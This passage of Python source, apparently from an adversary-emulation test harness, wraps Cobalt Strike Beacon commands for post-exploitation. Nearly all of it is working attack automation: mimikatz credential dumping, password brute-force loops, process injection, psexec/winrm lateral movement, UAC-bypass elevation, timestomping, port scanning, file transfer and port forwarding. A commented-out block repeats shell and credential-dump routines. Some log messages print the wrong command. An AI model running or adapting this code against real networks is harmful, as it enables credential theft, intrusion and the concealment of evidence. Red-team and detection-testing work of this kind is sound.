        :param target_path: file to be downloaded from target system
        :param local_path: will not be implemented.
        :return:
        """
        result = False

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bdownload command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bdownload({session.beacon_id}, '{target_path}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:

            task_result = beacon.bdownload(target_path, local_path)
            result = task_result.success

            if task_result.success and local_path:
                # only copy if local_path not empty
                download_path = task_result.output
                copy_file = copy_file_from_download(local_path, download_path)
                if copy_file:
                    print(f"Failed to copy {download_path} to {local_path}")

        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def simulate_brute_force(self, session: Session, username: str, password: str, domain: str, reps: int) -> CmdResult:
        """
        Simulate brute force attacks by sending random passwords to the target.  Use correct password as resps + 1 tries
        :param session:  session of target system
        :param username: user's username
        :param password: user's correct password
        :param domain: user's domain
        :param reps: number of failed attempts
        :return:
        """

        result = CmdResult()

        print(f"[*] Simulate brute force attack ...")
        cmd = "notepad.exe"

        # Generate random password
        for i in range(1, reps):
            all_char = string.ascii_letters + string.digits
            random_password = ''.join(random.choices(all_char, k=16))
            print(f"Attempt {i} to connect to {session.beacon_id}")

            fail_result = self.runas(session, username, random_password, domain, cmd)
            time.sleep(int(session.sleep))

        # Sleep for the duration of beacon's sleep time
        time.sleep(int(session.sleep))

        # Connect with correct password
        correct_result = self.runas(session, username, password, domain, cmd)

        result.success = correct_result.success
        result.result = correct_result.result

        return result

    def run_mimikatz(self, session: Session) -> CmdResult:
        """
        This method scrapes password hashes using the mimikatz sekurlsa::logonpasswords module.

        Must be run on a privileged session.
        If the success boolean in the return object is True but the result list is empty, it means Mimikatz
        ran successfully but could not gather any passwords.

        :param session: session to run mimikatz on
        :return: CmdResult object containing mimikatz output
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing brunas command to Beacon {session.beacon_id}")
        sekurlsa = "sekurlsa::logonpasswords"
        aggressor_cmd = f"bmimikatz({session.beacon_id}, '{sekurlsa}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bmimikatz(sekurlsa)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result
#*******************************************************
# Cobaltstrike Specified Commands
#*******************************************************
    def run_bls(self, session: Session, path):

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bls command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bls({session.beacon_id}, {path})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bls(path)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_bps(self, session: Session) -> CmdResult:
        """
       Run bps cmd command on the specified session
       :param session: session to run the command on
       :return: CmdResult containing output of bps in list
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bps command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bps({session.beacon_id})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bps()
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_binject(self, session: Session, pid, listener, arch = "x86") -> CmdResult:
        """
        Run binject cmd command on the specified pid
       :param session: session to run the command on
       :param pid: process id to be injected
       :param listener: name of the listener
       :param arch: process architect (x86|x64)
       :return: CmdResult.  If success will contain beacon dict info in result

        Note: Beacon Dict keys list
        {'note', 'charset', 'internal', 'alive', 'session', 'listener', 'pid',
        'lastf', 'sleep': [60, 0, 1], 'computer', 'host', 'is64', 'id':, 'process',
        'ver', 'last', 'os', 'barch', 'phint', 'external', 'port', 'build', 'pbid',
        'arch', 'user', 'impersonated', '_accent'
        }
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing binject command to Beacon {session.beacon_id}")
        aggressor_cmd = f"binject({session.beacon_id}, {pid}, {listener}, {arch})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.binject(pid, listener, arch)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_bjump(self, session: Session, exploit, target_ip, listener) -> CmdResult:
        """
        Run bjump cmd command on the specified target ip
       :param session: session to run the command on
       :param exploit: method use to jump. Option: psexec, psexec64, winrm, winrm64
       :param target_ip:  ip of target machine
       :param listener: name of the listener
       :return: CmdResult. If success will contain beacon dict info in result

        Note: Beacon Dict keys list
        {'note', 'charset', 'internal', 'alive', 'session', 'listener', 'pid',
        'lastf', 'sleep': [60, 0, 1], 'computer', 'host', 'is64', 'id':, 'process',
        'ver', 'last', 'os', 'barch', 'phint', 'external', 'port', 'build', 'pbid',
        'arch', 'user', 'impersonated', '_accent'
        }
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bjump command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bjump({session.beacon_id}, '{exploit}', '{target_ip}', {listener})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bjump(exploit, target_ip, listener)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_bspawnas(self, session: Session, domain, user, password, listener) -> CmdResult:
        """
        Run bspawnas cmd command
       :param session: session to run the command on
       :param domain: the user's domain
       :param user: the user's username
       :param password: the user's password
       :param listener: name of the listener
       :return: CmdResult. If success will contain beacon dict info in result

        Note: Beacon Dict keys list
        {'note', 'charset', 'internal', 'alive', 'session', 'listener', 'pid',
        'lastf', 'sleep': [60, 0, 1], 'computer', 'host', 'is64', 'id':, 'process',
        'ver', 'last', 'os', 'barch', 'phint', 'external', 'port', 'build', 'pbid',
        'arch', 'user', 'impersonated', '_accent'
        }
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bjump command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bjump({session.beacon_id}, '{domain}', '{user}', '{password}' {listener})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bspawnas(domain, user, password, listener)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def simulate_brute_force_with_spawnas(self, session: Session, domain, user, password, listener, reps) -> CmdResult:
        """
        Simulate brute force attacks by sending random passwords to the target.  Use correct password as resps + 1 tries
        :param session:  session of target system
        :param domain: the user's domain
        :param user: the user's username
        :param password: the user's correct password
        :param listener: name of the listener
        :param reps: number of failed attempts
        :return:  CmdResult.  If success will contain beacon dict info in result at reps + 1 attempts

        Note: Beacon Dict keys list
        {'note', 'charset', 'internal', 'alive', 'session', 'listener', 'pid',
        'lastf', 'sleep': [60, 0, 1], 'computer', 'host', 'is64', 'id':, 'process',
        'ver', 'last', 'os', 'barch', 'phint', 'external', 'port', 'build', 'pbid',
        'arch', 'user', 'impersonated', '_accent'
        }
        """

        result = CmdResult()

        print(f"[*] Simulate brute force attack ...")

        # Generate random password
        for i in range(1, reps):
            all_char = string.ascii_letters + string.digits
            random_password = ''.join(random.choices(all_char, k=16))
            print(f"Attempt {i} to connect to {session.beacon_id}")

            fail_result = self.run_bspawnas(session, domain, user, random_password, listener)
            print(f"Attempt {i}: {fail_result.result}")
            time.sleep(60)

        # Sleep for the duration of beacon's sleep time
        time.sleep(session.sleep)

        # Connect with correct password
        correct_result = self.run_bspawnas(session, domain, user, password, listener)

        return correct_result

    def run_bportscan(self, session: Session, target_ip, port, method, max_socket=5)-> CmdResult:
        """
        Ask beacon to run its port scanner
        Args:
            target_ip: the target to scan (e.g., 192.168.12.0/24)
            port: the port to scan (e.g., 1-1024,6667)
            method: the discovery method to use (arp|icmp|none)
            max_socket: the max number of sockets to user (e.g., 1024)

        Returns:

        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bportscan command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bportscan({session.beacon_id}, '{target_ip}', '{port}', '{method}', {max_socket})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bportscan(target_ip, port, method, max_socket)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_getuid(self, session: Session)-> CmdResult:
        """
        Ask beacon to print the User ID of the current token
        Args:
            session: current session
        Returns: CmdResult. if success, return true and output

        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bgetuid command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bgetuid({session.beacon_id})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bgetuid()
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_pwd(self, session: Session)-> CmdResult:
        """
        Ask beacon to print current working directory
        Args:
            session: current session
        Returns: CmdResult. if success, return true and output

        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bpwd command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bpwd({session.beacon_id})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bpwd()
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def run_btimestomp(self, session: Session, target_file_path: str, local_file_path: str) -> bool:
        """
        Ask beacon to change the target_file modified/accessed/created times to match local_file
        Args:
            session: session to run the command on
            target_file_path: The file to update timestamp values for
            local_file_path: The file to grab timestamp values from

        Returns:

        """

        result = False

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing btimestomp command to Beacon {session.beacon_id}")
        aggressor_cmd = f"elevate({session.beacon_id}, '{target_file_path}', '{local_file_path}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.btimestomp(target_file_path, local_file_path)
            result = task_result.success

        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    #TODO:
    def run_elevate(self, session: Session, listener) -> CmdResult:
        """
       Run belevate command on the beacon.
       Success will spawn a powershell session with an elevated privilege
       :param session: session to run the command on
       :param listener: name of the listener
       :return: CmdResult
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing belevate command to Beacon {session.beacon_id}")
        aggressor_cmd = f"elevate({session.beacon_id}, 'uac-schtasks', '{listener}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.belevate(listener)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result


#     def wait_for_beacon_checkin_with_ip(self, original_ip: str, listener_name: Optional[str] = None,
#                                         timeout: str = "120s") -> str:
#         """
#         Waits for a new beacon with a DIFFERENT IP to check in, optionally filtering by listener.
#         Handles JavaList return type from cs.get_beacons().
#         """
#         #c2 = self._ensure_ready()
#         c2 = self._configure_and_validate()
#
#         timeout_seconds = self._parse_robot_time(timeout)
#         # print(f"WAIT: Waiting up to {timeout_seconds}s for beacon check-in with DIFFERENT IP (NOT {original_ip})" + (f" for listener '{listener_name}'" if listener_name else ""))
#
#         # Store initial beacon IDs as a set of strings
#         initial_beacon_ids_set: set[str] = set()
#         try:
#             print("WAIT: Attempting to get initial beacon list...")
#             with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=f"{c2.USER}_wait_initial", cs_pass=c2.CS_PASSWORD,
#                              cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#                 # get_beacons returns JavaList, iterate through it
#                 raw_initial_beacons = cs.get_beacons()  # This is the JavaList
#                 if raw_initial_beacons:  # Check if it's not None or empty
#                     for beacon_info in raw_initial_beacons:
#                         # Access 'id' key, assuming each item behaves like a dict
#                         try:
#                             bid = str(beacon_info['id']).strip()  # Get ID, convert to string, strip whitespace
#                             initial_beacon_ids_set.add(bid)
#                         except (KeyError, TypeError) as e:
#                             print(
#                                 f"WAIT WARNING: Error accessing 'id' in initial beacon info: {beacon_info}. Error: {e}")
#                 print(
#                     f"WAIT: Initial beacon count: {len(initial_beacon_ids_set)}. IDs: {sorted(list(initial_beacon_ids_set))}")
#         except Exception as e:
#             # Catch potential issues during initial fetch, including AttributeErrors if assumptions are wrong
#             print(f"WAIT WARNING: Could not get or process initial beacon list: {type(e).__name__}: {e}")
#
#         start_time = time.time()
#         iteration = 0
#         print(f"WAIT: Starting polling loop at {time.strftime('%H:%M:%S')}")
#
#         while time.time() - start_time < timeout_seconds:
#             iteration += 1
#             print(f"\nWAITLOOP {iteration}: Entering loop iteration at {time.strftime('%H:%M:%S')}")
#
#             current_beacons_list = None  # Initialize for this iteration
#             connection_error = None
#
#             try:
#                 connector_user = f"{c2.USER}_wait_check_{int(time.time())}_{iteration}"
#                 print(f"WAITLOOP {iteration}: Attempting connection with user {connector_user}...")
#                 with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=connector_user, cs_pass=c2.CS_PASSWORD,
#                                  cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
#                     print(f"WAITLOOP {iteration}: Connected. Attempting cs.get_beacons()...")
#                     current_beacons_list = cs.get_beacons()  # Should be JavaList or None
#                     print(f"WAITLOOP {iteration}: cs.get_beacons() completed (Type: {type(current_beacons_list)}).")
#
#                     if current_beacons_list is None:
#                         print(f"WAITLOOP {iteration}: No beacons currently reported by get_beacons().")
#                         current_beacons_list = []  # Treat None as empty list for iteration
#
#             except Exception as e:
#                 connection_error = e
#                 print(f"WAITLOOP {iteration}: ERROR during CS connection/get_beacons: {type(e).__name__}: {e}")
#
#             # --- Process results ONLY if connection and get_beacons succeeded ---
#             if connection_error is None:
#                 found_match = False  # Flag to break inner loop once match found
#                 processed_ids_this_iter = []  # Track IDs processed in this poll
#
#                 try:
#                     for beacon_info in current_beacons_list:  # Iterate through the JavaList
#                         processed_ids_this_iter.append(str(beacon_info.get('id', 'ERROR')))  # Log what we see
#                         try:
#                             bid = str(beacon_info['id']).strip()  # Access 'id', convert, strip
#                             bip = beacon_info.get('ip', 'UNKNOWN')  # Get IP, Default to 'UNKNOWN'
#                         except (KeyError, TypeError) as e:
#                             print(
#                                 f"WAITLOOP {iteration}: ERROR accessing 'id' or 'ip' in current beacon info: {beacon_info}. Skipping. Error: {e}")
#                             continue  # Skip this beacon if ID or IP cannot be accessed
#
#                         # THE CRITICAL CHECK: Is the current ID NOT in the initial set AND does it have a DIFFERENT IP?
#                         if bid not in initial_beacon_ids_set and bip != original_ip:
#                             beacon_listener = beacon_info.get('listener', 'Unknown')
#                             print(
#                                 f"WAITLOOP {iteration}:  -> NEW Beacon Detected! ID='{bid}', Listener='{beacon_listener}', IP='{bip}'")
#
#                             # Check listener filter
#                             if listener_name is None or beacon_listener.lower() == listener_name.lower():
#                                 print(f"WAITLOOP {iteration}:  -> MATCH FOUND! Returning beacon ID: '{bid}'")
#                                 return bid  # Success!
#                             else:
#                                 print(
#                                     f"WAITLOOP {iteration}:  -> New beacon '{bid}' ignored (Filter mismatch: need Listener='{listener_name}')")
#                                 initial_beacon_ids_set.add(bid)  # Prevent detection in future loops
#                         else:
#                             if bid in initial_beacon_ids_set:
#                                 print(f"WAITLOOP {iteration}:  -> Existing beacon ID '{bid}'.")
#                             if bip == original_ip:
#                                 print(f"WAITLOOP {iteration}:  -> Beacon '{bid}' has original IP '{bip}', skipping.")
#
#                     if iteration % 6 == 1:  # Log periodically which IDs were processed
#                         print(
#                             f"WAITLOOP {iteration}: Finished processing current poll. IDs seen: {sorted(processed_ids_this_iter)}")
#
#
#                 except AttributeError as list_iter_err:
#                     # Catch error if current_beacons_list doesn't support iteration
#                     print(
#                         f"WAITLOOP {iteration}: ERROR iterating through get_beacons result: {type(list_iter_err).__name__}: {list_iter_err}. Result was: {current_beacons_list}")
#                 except Exception as proc_err:
#                     # Catch other unexpected errors during processing
#                     print(f"WAITLOOP {iteration}: ERROR processing beacon list: {type(proc_err).__name__}: {proc_err}")
#
#             else:
#                 print(f"WAITLOOP {iteration}: Skipping comparison due to connection/get_beacons error.")
#
#             print(f"WAITLOOP {iteration}: Iteration complete. Sleeping 5s...")
#             time.sleep(5)  # Check interval
#
#         # If loop finishes, timeout occurred
#         print(f"WAIT: Loop finished after {time.time() - start_time:.1f} seconds.")  # Log loop end time
#         raise RuntimeError(
#             f"Timeout: No new matching beacon checked in with different IP (not {original_ip}) within {timeout_seconds} seconds.")
#
#     # --- issue_* Methods remain largely the same, ensure _get_beacon_for_session is used ---
#     # Example: issue_cmd_to_shell
#
#     def issue_cmd_to_shell(self, session: Session, cmd: str) -> CmdResult:
#         """
#         Execute a command on the target machine via Cobalt Strike Beacon.
#         Capture any error messages and return a structured result.
#         """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"Issuing shell command to Beacon {beacon_id}: '{cmd}'")
#         # Commenting to exclude this for BAQT AC1 - not compatible with wmic powershell commands
#         # escaped_cmd = cmd.replace("'", "'\\''")
#         # aggressor_cmd = f"bshell({beacon_id}, '{escaped_cmd}');"
#         aggressor_cmd = f"bshell({beacon_id}, '{cmd}');"
#         expect_pattern = r'received output:.*'
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}: {cmd}")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_send_cmd", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending command...")
#             cs.ag_sendline(aggressor_cmd)
#
#             # print(f"[*] Waiting for output (timeout={timeout}s)...")
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             error_messages = [
#                 "not recognized",
#                 "access is denied",
#                 "system error",
#                 "network path was not found",
#                 "unknown command",
#                 "syntax error",
#                 "operation failed",
#                 "cannot find the path specified"
#             ]
#
#             output_lower = processed_output.lower()
#             found_error = False
#             for error_substring in error_messages:
#                 if error_substring in output_lower:
#                     print(f"[!] Detected error indicator: '{error_substring}'")
#                     result.success = False
#                     result.result = f"Command failed (error detected): {processed_output}"
#                     found_error = True
#                     break
#
#             # If no known error substring was found, consider it success
#             if not found_error:
#                 result.success = True
#
#         print(f"[*] Command execution finished. Success: {result.success}")
#         return result
#
#     def issue_credential_dump(self, session: Session) -> CmdResult:
#         """
#         Execute logonpassword dump on the target machine via Cobalt Strike Beacon.
#         Capture any error messages and return a structured result.
#         """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"Issuing logonpassword command to Beacon {beacon_id}")
#         aggressor_cmd = f"blogonpasswords({beacon_id})"
#         expect_pattern = r'received output:.*'
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_dump_credentials",
#                          cs_pass=self.CS_PASSWORD, cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending credential dump request...")
#             cs.ag_sendline(aggressor_cmd)
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             result.success = True
#             result.result = f"Logon credentials captured"
#
#         return result
#
#     def issue_bcd(self, session: Session, remote_path: str) -> CmdResult:
#         """
#         Execute a change directory command
#         """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"Issuing change directory command to Beacon {beacon_id}: '{remote_path}'")
#         aggressor_cmd = f"bcd({beacon_id}, '{remote_path}');"
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}: {remote_path}")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_send_cd", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending directory change request...")
#             #cs.ag_sendline(f"bclear({beacon_id})")
#             cs.ag_sendline(aggressor_cmd)
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             # cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             result.success = True
#             result.result = f"Directory change successful"
#         return result
#
#     def issue_bdownload(self, session: Session, remote_path: str) -> CmdResult:
#         """
#         Execute file download on the target machine via Cobalt Strike Beacon.
#         Capture any error messages and return a structured result.
#         """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"[*] Issuing download command to Beacon {beacon_id}")
#         remote_path_escaped = remote_path.replace("\\", "\\\\")
#         aggressor_cmd = f"bdownload({beacon_id}, '{remote_path_escaped}');"
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_download", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending download request...")
#             cs.ag_sendline(f"bclear({beacon_id})")
#             cs.ag_sendline(aggressor_cmd)
#
#             # This is a situation where we don't get output, but we do get a message when it's complete. For now, I'm lazy coding to just do .* for file name,
#             # but you could make that more precise if it causes errors in the future
#             checkin_catcher = f"on beacon_output_alt{{if($1 eq '{beacon_id}'){{ println($2);}}}}"
#             cs.ag_sendline(checkin_catcher)
#
#             try:
#                 # cs.cs_process.expect(r'download of .* is complete.*', timeout=60)
#                 result.completed = datetime.now()
#                 result.success = True
#
#             except:
#                 result.completed = datetime.now()
#                 result.success = False
#
#         return result
#
#     def issue_bupload(self, session: Session, file_path: str, remote_path: str) -> CmdResult:
#         """
#         Execute file upload on the target machine via Cobalt Strike Beacon.
#         Capture any error messages and return a structured result.
#         """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False
#             result.result = "Failed to get Beacon object for session."
#             print(f"[!] Error: {result.result}")
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"[*] Issuing download command to Beacon {beacon_id}")
#         remote_path_escaped = remote_path.replace("\\", "\\\\")
#         checkin_catcher = f"on beacon_output_alt{{if($1 eq '{beacon_id}'){{ println($2);}}}}"
#         aggressor_cmd = f"bupload({beacon_id}, '{file_path}', '{remote_path_escaped}');"
#         #aggressor_cmd = f"bupload_raw({beacon_id}, '{remote_path_escaped}', '{file_path}');"
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         file_size = os.path.getsize(file_path)
#         outputs = []
#         bytes_sent = 0
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_download", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending upload request...")
#             #cs.ag_sendline(f"bclear({beacon_id})")
#             cs.ag_sendline(aggressor_cmd)
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             # cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             result.success = True
#             result.result = f"Directory change successful"
#         return result
#
#     def issue_brportfwd(self, session: Session, bind_port: int, host: str, port_fwd: int) -> CmdResult:
#         """
#         Execute port forwarding on target machine via Cobalt Strike Beacon.
#         Capture any error messages and return a structured result.
#         """
#         result = CmdResult()
#         beacon = self._get_beacon_for_session(session)
#         if not beacon:
#             result.success = False;
#             result.result = "Failed get Beacon obj.";
#             return result
#
#         beacon_id = session.beacon_id
#         print(f"[*] Issuing port forwarding on {beacon_id}")
#         aggressor_cmd = f"brportfwd({beacon_id}, '{bind_port}', '{host}', '{port_fwd}');"
#
#         print(f"[*] Attempting to run on Beacon {beacon_id}")
#         # print(f"[*] Connecting as: {connector_user}")
#         print(f"[*] Aggressor Cmd: {aggressor_cmd}")
#
#         with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_port_forward", cs_pass=self.CS_PASSWORD,
#                          cs_port=self.PORT, cs_directory=self.CS_DIR) as cs:
#             print(f"[*] Sending port forward request...")
#             cs.ag_sendline(f"bclear({beacon_id})")
#             cs.ag_sendline(aggressor_cmd)
#
#             output_catcher = f"on beacon_output{{ if ($1 eq '{beacon_id}') {{ println($2); }} }}"
#
#             cs.ag_sendline(output_catcher)
#             # cs.cs_process.expect(expect_pattern, timeout=None)
#
#             print(f"[*] Output received. Before...")
#             print(cs.cs_process.before.decode())
#
#             print(f"[*] Output received. After...")
#             print(cs.cs_process.after.decode())
#
#             processed_output = cs.cs_process.after.decode()
#
#             result.success = True
#             result.result = f"Port forward successful"
#         return result
#
#     def issue_bpowershell(self, session: Session, cmd: str) -> CmdResult:
#         result = CmdResult();
#         beacon = self._get_beacon_for_session(session)
